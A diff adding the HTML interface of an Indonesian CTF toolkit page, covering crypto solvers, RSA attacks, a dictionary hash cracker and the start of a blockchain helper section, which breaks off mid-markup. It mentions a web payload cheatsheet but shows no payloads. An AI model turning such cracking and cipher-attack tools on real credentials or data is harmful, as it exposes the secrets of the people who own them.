@@ -1,0 +1,2356 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="CyLab CTF OmniTool: Modern offline-first CTF toolkit for Cryptography, Blockchain, Forensics, Reverse Engineering, Binary Exploitation, and Web.">
+  <title>CyLab CTF OmniTool · GetsFlag Hardened Edition</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/tools.css">
+  <script src="/assets/js/noble-crypto.min.js"></script>
+  <style>/* Hallmark: v1 */
+:root {
+  --toast-bg: #181824;
+  --toast-border: #4FD08B;
+  --toast-err-border: #E5484D;
+  --sniff-bg: rgba(229,72,77,0.08);
+  --flag-hover-ink: #08080c;
+  --star-gold: #facc15;
+  --ref-hover-bg: #161624;
+}
+html, body {
+  overflow-x: clip;
+}
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: 0.01ms !important;
+    transition-duration: 0.01ms !important;
+    scroll-behavior: auto !important;
+  }
+}
+button:active, .btn:active, .fs-flag:active { transform: translateY(1px); }
+button:disabled, .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    /* Workstation layout overrides */
+    .view-container { display: none; }
+    .view-container.is-active { display: block; animation: fadeIn .18s ease-in-out; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
+    .nav-item.is-active { background: var(--red-dim); color: var(--ink); border-color: var(--red-dim-bd); }
+    .nav-item.is-active svg { stroke: var(--red-hi); }
+    .subtab.is-active { background: var(--card); color: var(--ink); border-color: var(--border); border-bottom-color: transparent; }
+    .tabpanel[hidden] { display: none !important; }
+    .tabpanel { animation: fadeIn .15s ease-in-out; }
+    .toast-popup { position: fixed; bottom: 20px; right: 20px; background: var(--toast-bg); border: 1px solid var(--border); border: 1px solid var(--toast-border); color: var(--ink); padding: 12px 16px; border-radius: 6px; font-size: 13px; font-weight: 500;  z-index: 99999; display: flex; align-items: center; gap: 8px; transition: opacity .2s ease, transform .2s ease; }
+    .toast-popup.toast-err { border-color: var(--toast-err-border); }
+    .search-box { margin-bottom: 20px; position: relative; }
+    .search-box input { width: 100%; background: var(--input); border: 1px solid var(--input-border); border-radius: 6px; padding: 8px 16px 8px 36px; color: var(--ink); font-size: 13px; font-family: var(--font-body); outline: none; }
+    .search-box input:focus { outline: 2px solid var(--red-hi); outline-offset: 2px; }
+    .search-box .ic { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: var(--faint); pointer-events: none; }
+    .search-box .kbd { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: var(--card-2); border: 1px solid var(--border); border-radius: 4px; padding: 4px 8px; font-size: 11px; color: var(--muted); font-family: var(--font-mono); }
+    .flagsniff { display: none; align-items: flex-start; gap: 12px; background: var(--sniff-bg); border: 1px solid var(--red-dim-bd); border-radius: 8px; padding: 12px 16px; margin-bottom: 20px; }
+    .fs-ic { font-size: 20px; line-height: 1; }
+    .fs-title { font-size: 13px; font-weight: 600; color: var(--ink); margin-bottom: 8px; }
+    .fs-flags { display: flex; flex-wrap: wrap; gap: 8px; }
+    .fs-flag { background: var(--card); border: 1px solid var(--border); color: var(--green); font-family: var(--font-mono); font-size: 12px; padding: 4px 8px; border-radius: 4px; cursor: pointer; transition: background-color .15s ease, color .15s ease, border-color .15s ease; }
+    .fs-flag:hover { background: var(--green); color: var(--flag-hover-ink); border-color: var(--green); }
+    .code__copy.copied { color: var(--green) !important; border-color: var(--green) !important; }
+    .star { color: var(--star-gold); margin-left: 4px; font-size: 12px; }
+    .host { color: var(--faint); font-size: 11px; margin-left: auto; font-family: var(--font-mono); }
+    .rr-top { display: flex; align-items: center; width: 100%; }
+    .refgroup { margin-bottom: 12px; border: 1px solid var(--border-soft); border-radius: 8px; background: var(--card-2); overflow: hidden; }
+    .refgroup[open] { border-color: var(--border); }
+    .refgroup-head { padding: 12px 16px; cursor: pointer; display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 14px; color: var(--ink); list-style: none; user-select: none; }
+    .refgroup-head::-webkit-details-marker { display: none; }
+    .refgroup-head .ic { color: var(--red-hi); display: flex; align-items: center; }
+    .refgroup-head .cnt { font-size: 12px; color: var(--muted); font-weight: 400; margin-left: auto; margin-right: 8px; }
+    .refgroup-head .chev { width: 16px; height: 16px; color: var(--faint); transition: transform .2s; }
+    .refgroup[open] .chev { transform: rotate(180deg); }
+    .reflist { list-style: none; margin: 0; padding: 0 12px 12px; display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 8px; }
+    .refrow { display: flex; flex-direction: column; gap: 4px; padding: 8px 12px; background: var(--card); border: 1px solid var(--border-soft); border-radius: 6px; transition: background-color .15s ease, color .15s ease, border-color .15s ease; }
+    .refrow:hover { border-color: var(--red-dim-bd); background: var(--ref-hover-bg); transform: translateY(-1px); }
+    .refrow .nm { font-weight: 600; color: var(--ink); font-size: 13px; }
+    .refrow .desc { font-size: 12px; color: var(--muted); line-height: 1.4; }
+  </style>
+</head>
+<body>
+
+  <!-- Topbar Mobile -->
+  <header class="topbar">
+    <button class="burger" id="burger" aria-label="Menu" type="button">
+      <svg aria-hidden="true" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+    <a class="brand" href="#dashboard">
+      <img src="/assets/img/getsflag-mark.png" alt="" aria-hidden="true" width="26" height="26">
+      <span class="wordmark">GetsFlag <small>Tools</small></span>
+    </a>
+  </header>
+  <div class="scrim" id="scrim"></div>
+
+  <!-- Sidenav -->
+  <nav class="side" id="sidenav">
+    <a class="brand" href="#dashboard" aria-label="GetsFlag Tools">
+      <img src="/assets/img/getsflag-mark.png" alt="" aria-hidden="true" width="26" height="26">
+      <span class="wordmark">GetsFlag <small>Tools</small></span>
+    </a>
+    <div class="nav">
+      <a class="nav-item is-active" href="#dashboard" data-nav="dashboard">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/></svg><span>Dashboard</span>
+      </a>
+      <a class="nav-item" href="#crypto" data-nav="crypto">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><span>Cryptography</span>
+      </a>
+      <a class="nav-item" href="#blockchain" data-nav="blockchain">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.3 7 12 12 20.7 7"/><line x1="12" y1="22" x2="12" y2="12"/></svg><span>Blockchain</span>
+      </a>
+      <a class="nav-item" href="#forensics" data-nav="forensics">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg><span>Forensics</span>
+      </a>
+      <a class="nav-item" href="#reverse" data-nav="reverse">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><path d="M9 2v2M15 2v2M9 20v2M15 20v2M20 9h2M20 14h2M2 9h2M2 14h2"/></svg><span>Reverse Engineering</span>
+      </a>
+      <a class="nav-item" href="#pwn" data-nav="pwn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg><span>Binary Exploitation</span>
+      </a>
+      <a class="nav-item" href="#web" data-nav="web">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg><span>Web Exploitation</span>
+      </a>
+      <div class="nav-sep" aria-hidden="true"></div>
+      <a class="nav-item" href="#referensi" data-nav="referensi">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg><span>Referensi</span>
+      </a>
+    </div>
+    <div class="foot">
+      <div class="foot-user">
+        <div class="foot-avatar" aria-hidden="true">W</div>
+        <div>
+          <div class="nm">whitejack</div>
+          <div class="st">Pro · Akses Penuh</div>
+        </div>
+      </div>
+      <div class="foot-links">
+        <a class="foot-link" href="https://getsflag.com/challenges" target="_blank" rel="noopener">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>Challenges
+        </a>
+        <a class="foot-link" href="https://writeup.getsflag.com" target="_blank" rel="noopener">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>Writeup
+        </a>
+      </div>
+      <a class="foot-logout" href="https://duckvaulta.ai.id" target="_blank" rel="noopener">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>DuckVaulta
+      </a>
+    </div>
+  </nav>
+
+  <!-- Main View Area -->
+  <main class="main">
+
+    <!-- Flag Sniffer Banner -->
+    <div id="flagsniff" class="flagsniff">
+      <div class="fs-ic" aria-hidden="true"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg></div>
+      <div style="flex:1">
+        <div class="fs-title" id="flagsniff-title">Flag terdeteksi (0) - klik untuk salin</div>
+        <div class="fs-flags" id="flagsniff-list"></div>
+      </div>
+    </div>
+
+    <!-- DASHBOARD VIEW -->
+    <section id="view-dashboard" class="view-container is-active">
+      <div class="page-head">
+        <span class="brackets" aria-hidden="true">⌐ ¬</span>
+        <h1>GetsFlag Tools</h1>
+        <p class="sub">Toolkit bantu mengerjakan challenge: pilih kategori di bawah.
+          <span class="pill" style="margin-left:4px">Pro · akses penuh</span>
+        </p>
+      </div>
+
+      <div class="search-box">
+        <span class="ic"><svg aria-hidden="true" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg></span>
+        <input type="text" id="global-search" placeholder="Cari tool CTF… (mis: rsa, cyclic, keccak, jwt, xor, sql, lfi)" oninput="filterCards(this.value)">
+        <span class="kbd">/</span>
+      </div>
+
+      <div class="cat-grid" id="dashboard-grid">
+        <a class="cat-card" href="#crypto" data-keywords="cryptography crypto rsa auto decode caesar affine vigenere xor diffie hellman ecc hash crack">
+          <span class="cat-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></span>
+          <h2>Cryptography</h2>
+          <p>Auto-decode (base / morse / rot / xor) + <b>solver</b>: RSA, affine, Vigenère, XOR brute, ECC/DH, hash-crack.</p>
+        </a>
+
+        <a class="cat-card" href="#blockchain" data-keywords="blockchain evm keccak selector abi calldata create create2 eip55 eth wei gwei">
+          <span class="cat-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.3 7 12 12 20.7 7"/><line x1="12" y1="22" x2="12" y2="12"/></svg></span>
+          <h2>Blockchain</h2>
+          <p>keccak256, selector fungsi, decode ABI/calldata, alamat CREATE / CREATE2, EIP-55, konversi unit.</p>
+        </a>
+
+        <a class="cat-card" href="#forensics" data-keywords="forensics file exiftool strings entropy binwalk hexdump stego pcap office wireshark">
+          <span class="cat-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg></span>
+          <h2>Forensics</h2>
+          <p>Upload file: file / exiftool / strings / binwalk / hexdump + cek stego, PCAP & dokumen Office.</p>
+        </a>
+
+        <a class="cat-card" href="#reverse" data-keywords="reverse engineering decompile pyc class jar elf objdump disasm inversion xor ghidra">
+          <span class="cat-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><path d="M9 2v2M15 2v2M9 20v2M15 20v2M20 9h2M20 14h2M2 9h2M2 14h2"/></svg></span>
+          <h2>Reverse Engineering</h2>
+          <p>Decompile .pyc / .jar / .class + disassembly ELF (objdump), inversi algoritma & sequence XOR.</p>
+        </a>
+
+        <a class="cat-card" href="#pwn" data-keywords="binary exploitation pwn cyclic pattern offset checksec rop gadget shellcode pwntools">
+          <span class="cat-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></span>
+          <h2>Binary Exploitation</h2>
+          <p>Cyclic pattern + offset De Bruijn, checksec ELF auditor, ROP gadget finder & shellcode.</p>
+        </a>
+
+        <a class="cat-card" href="#web" data-keywords="web exploitation jwt crack encoder decoder hash generator cheatsheet sqli xss ssti lfi rce">
+          <span class="cat-ic"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></span>
+          <h2>Web Exploitation</h2>
+          <p>JWT decode / crack, encoder / decoder multi-format, hash generator, cheatsheet payload CTF.</p>
+        </a>
+      </div>
+
+      <div class="infobox" style="margin-top:18px">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+        <span>Semua tool web/pwn bersifat <b>generator / analisa</b>: server tidak menembak target luar. Untuk eksploitasi, pakai hasilnya ke instance challenge-mu sendiri.</span>
+      </div>
+    </section>
+
+    <!-- CRYPTOGRAPHY VIEW -->
+    <section id="view-crypto" class="view-container">
+      <div class="page-head">
+        <span class="brackets" aria-hidden="true">⌐ ¬</span>
+        <h1>Cryptography</h1>
+        <p class="sub">Auto-decode (base / morse / rot / xor) + solver: RSA, affine, Vigenère, XOR brute, ECC/DH, hash-crack.</p>
+      </div>
+
+      <div class="subtabs" role="tablist" data-group="crypto">
+        <button class="subtab is-active" data-tab="auto" role="tab" aria-selected="true">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8z"/></svg>Auto-decode
+        </button>
+        <button class="subtab" data-tab="rsa" role="tab" aria-selected="false">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>RSA
+        </button>
+        <button class="subtab" data-tab="klasik" role="tab" aria-selected="false">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>Cipher klasik
+        </button>
+        <button class="subtab" data-tab="eccdh" role="tab" aria-selected="false">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M4 9c4 4 12 4 16 0M4 15c4-4 12-4 16 0"/></svg>ECC / DH
+        </button>
+        <button class="subtab" data-tab="hash" role="tab" aria-selected="false">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>Hash crack
+        </button>
+      </div>
+
+      <!-- Tabpanel: Auto-decode -->
+      <div class="tabpanel" data-group="crypto" data-tab="auto">
+        <div class="card" style="border-color:var(--red-dim-bd)">
+          <h2>Auto-detect: tinggal paste params / ciphertext</h2>
+          <p class="sub" style="margin-bottom:10px">Tempel apa saja (n/e/c RSA, Base64/32/85, Hex, Binary, Morse, Caesar, XOR, Hash). Sistem menganalisa struktur & auto-solve langsung di browser.</p>
+          <textarea id="cauto_in" class="textarea" placeholder="Paste params RSA (mis: n=..., e=..., c=...) atau ciphertext…"></textarea>
+          <div class="row" style="margin-top:12px">
+            <button class="btn btn--primary" onclick="runCryptoAuto()">Auto-detect & Solve</button>
+          </div>
+          <div id="cauto_out"></div>
+        </div>
+      </div>
+
+      <!-- Tabpanel: RSA -->
+      <div class="tabpanel" data-group="crypto" data-tab="rsa" hidden>
+        <div class="card">
+          <h2>RSA: Manual Solver</h2>
+          <p class="sub" style="margin-bottom:12px">Masukkan parameter yang diketahui (n, e, c, p, q, d, atau phi). Kosongkan yang tidak ada.</p>
+          <div class="row">
+            <div class="grow"><label class="lbl" for="rsa_n">Modulus n</label><input id="rsa_n" class="input" placeholder="n"></div>
+            <div style="width:140px"><label class="lbl" for="rsa_e">Exponent e</label><input id="rsa_e" class="input" value="65537"></div>
+          </div>
+          <div class="row" style="margin-top:10px">
+            <div class="grow"><label class="lbl" for="rsa_c">Ciphertext c</label><input id="rsa_c" class="input" placeholder="c"></div>
+          </div>
+          <div class="row" style="margin-top:10px">
+            <div class="grow"><label class="lbl" for="rsa_p">Prime p</label><input id="rsa_p" class="input" placeholder="p (opsional)"></div>
+            <div class="grow"><label class="lbl" for="rsa_q">Prime q</label><input id="rsa_q" class="input" placeholder="q (opsional)"></div>
+          </div>
+          <div class="row" style="margin-top:10px">
+            <div class="grow"><label class="lbl" for="rsa_d">Private key d</label><input id="rsa_d" class="input" placeholder="d (opsional)"></div>
+          </div>
+          <div class="row" style="margin-top:14px">
+            <button class="btn btn--primary" onclick="solveRSAManual()">Pecahkan RSA</button>
+          </div>
+          <div id="rsa_out"></div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <h2>Serangan Khusus RSA</h2>
+          <p class="sub" style="margin-bottom:12px">Wiener (small d), Common Modulus (dua ciphertext dengan n sama), dan Hastad Broadcast (e=3).</p>
+          <div class="row">
+            <select id="rsa_attack_type" class="select" onchange="toggleRSAAttackInputs(this.value)">
+              <option value="wiener">Wiener Attack (d < 1/3 n^0.25)</option>
+              <option value="common_mod">Common Modulus Attack (n sama, e1 & e2 coprime)</option>
+              <option value="hastad">Hastad Broadcast Attack (e=3, 3 pairs c & n)</option>
+            </select>
+            <button class="btn btn--secondary" onclick="runRSASpecialAttack()">Jalankan Serangan</button>
+          </div>
+          <div id="rsa_special_inputs" style="margin-top:12px"></div>
+          <div id="rsa_special_out"></div>
+        </div>
+      </div>
+
+      <!-- Tabpanel: Cipher Klasik -->
+      <div class="tabpanel" data-group="crypto" data-tab="klasik" hidden>
+        <div class="card">
+          <h2>XOR, Affine, Caesar, Vigenère, Railfence</h2>
+          <label class="lbl" for="klasik_in">Ciphertext</label>
+          <textarea id="klasik_in" class="textarea sm" placeholder="Ciphertext…"></textarea>
+          <div class="row" style="margin-top:12px">
+            <div>
+              <label class="lbl" for="klasik_type">Metode</label>
+              <select id="klasik_type" class="select" style="min-width:180px" onchange="toggleKlasikKeyInput(this.value)">
+                <option value="caesar">Caesar (Semua 25 Shift)</option>
+                <option value="xor_brute">XOR (Brute Force 1-Byte 0-255)</option>
+                <option value="xor_key">XOR dengan Key</option>
+                <option value="vigenere">Vigenère Decrypt</option>
+                <option value="affine">Affine Cipher (ax + b)</option>
+                <option value="railfence">Railfence (Zigzag)</option>
+              </select>
+            </div>
+            <div id="klasik_key_wrap" class="grow" style="display:none">
+              <label class="lbl" for="klasik_key">Key / Parameter</label>
+              <input id="klasik_key" class="input" placeholder="Key atau a,b">
+            </div>
+            <button class="btn btn--primary" style="margin-top:auto" onclick="solveKlasik()">Pecahkan</button>
+          </div>
+          <div id="klasik_out"></div>
+        </div>
+      </div>
+
+      <!-- Tabpanel: ECC / DH -->
+      <div class="tabpanel" data-group="crypto" data-tab="eccdh" hidden>
+        <div class="card">
+          <h2>Diffie-Hellman Key Exchange</h2>
+          <p class="sub" style="margin-bottom:12px">Hitung Shared Secret: K = B^a mod p = A^b mod p.</p>
+          <div class="row">
+            <div class="grow"><label class="lbl" for="dh_p">Prime Modulus p</label><input id="dh_p" class="input" placeholder="p"></div>
+            <div style="width:140px"><label class="lbl" for="dh_g">Generator g</label><input id="dh_g" class="input" value="2"></div>
+          </div>
+          <div class="row" style="margin-top:10px">
+            <div class="grow"><label class="lbl" for="dh_a">Alice Private a (opsional)</label><input id="dh_a" class="input" placeholder="a"></div>
+            <div class="grow"><label class="lbl" for="dh_pubB">Bob Public B = g^b mod p</label><input id="dh_pubB" class="input" placeholder="B"></div>
+          </div>
+          <div class="row" style="margin-top:14px">
+            <button class="btn btn--primary" onclick="solveDH()">Hitung Secret</button>
+          </div>
+          <div id="dh_out"></div>
+        </div>
+
+        <div class="card" style="margin-top:16px">
+          <h2>Elliptic Curve Point Math: y² = x³ + a·x + b (mod p)</h2>
+          <p class="sub" style="margin-bottom:12px">Penjumlahan titik P + Q atau perkalian skalar k · P (Double-and-Add).</p>
+          <div class="row">
+            <div class="grow"><label class="lbl" for="ec_p">Prime Modulus p</label><input id="ec_p" class="input" placeholder="p"></div>
+            <div style="width:120px"><label class="lbl" for="ec_a">Parameter a</label><input id="ec_a" class="input" value="0"></div>
+            <div style="width:120px"><label class="lbl" for="ec_b">Parameter b</label><input id="ec_b" class="input" value="7"></div>
+          </div>
+          <div class="row" style="margin-top:10px">
+            <div class="grow"><label class="lbl" for="ec_px">Titik P (x)</label><input id="ec_px" class="input" placeholder="Px"></div>
+            <div class="grow"><label class="lbl" for="ec_py">Titik P (y)</label><input id="ec_py" class="input" placeholder="Py"></div>
+          </div>
+          <div class="row" style="margin-top:10px">
+            <div class="grow"><label class="lbl" for="ec_k">Skalar k (untuk k·P)</label><input id="ec_k" class="input" placeholder="k (misal: 2)"></div>
+            <button class="btn btn--primary" style="margin-top:auto" onclick="calcECC()">Hitung Titik</button>
+          </div>
+          <div id="ec_out"></div>
+        </div>
+      </div>
+
+      <!-- Tabpanel: Hash Crack -->
+      <div class="tabpanel" data-group="crypto" data-tab="hash" hidden>
+        <div class="card">
+          <h2>Hash Crack (Wordlist CTF Cepat)</h2>
+          <p class="sub" style="margin-bottom:12px">Dictionary attack kilat di client-side untuk MD5, SHA1, SHA256 terhadap ribuan password umum.</p>
+          <div class="row">
+            <div class="grow">
+              <label class="lbl" for="hcrack_in">Target Hash</label>
+              <input id="hcrack_in" class="input" placeholder="Hash target (MD5, SHA1, SHA256)">
+            </div>
+            <button class="btn btn--primary" style="margin-top:auto" onclick="crackHashFast()">Crack Hash</button>
+          </div>
+          <div id="hcrack_out"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- BLOCKCHAIN VIEW -->
+    <section id="view-blockchain" class="view-container">
+      <div class="page-head">
+        <span class="brackets" aria-hidden="true">⌐ ¬</span>
+        <h1>Blockchain</h1>
+        <p class="sub">Helper EVM/web3 sisi-aman: keccak, selector fungsi, decode ABI/calldata, derivasi alamat kontrak, EIP-55, konversi unit. Semua offline: tak ada panggilan RPC keluar.</p>
+      </div>
+
+      <div class="subtabs" role="tablist" data-group="bc">
+        <button class="subtab is-active" data-tab="auto" role="tab" aria-selected="true">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Auto-detect
+        </button>
+        <button class="subtab" data-tab="hash" role="tab" aria-selected="false">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>Keccak & Selector
+        </button>
+        <button class="subtab" data-tab="abi" role="tab" aria-selected="false">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>Decode ABI
+        </button>
+        <button class="subtab" data-tab="addr" role="tab" aria-selected="false">
+          <svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.3 7 12 12 20.7 7"/><line x1="12" y1="22" x2="12" y2="12"/></svg>Alamat kontrak
+        </button>
+        <button class="subtab" data-tab="util" role="tab" aria-selected="false">
